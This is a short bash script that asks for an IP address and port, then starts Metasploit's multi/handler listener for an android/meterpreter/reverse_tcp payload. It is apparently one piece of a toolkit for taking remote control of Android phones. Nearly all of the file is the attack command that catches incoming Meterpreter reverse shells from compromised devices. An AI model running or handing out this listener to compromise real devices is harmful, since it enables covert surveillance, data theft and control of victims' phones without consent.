#!/bin/bash

echo -e "\033[0;33m"
echo "Executing the listener ..."
sleep 1
echo -e "\033[0;36m"
read -p "Enter your IP Address ===>" ip
read -p "Enter payload's listener port ===>" Port 
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
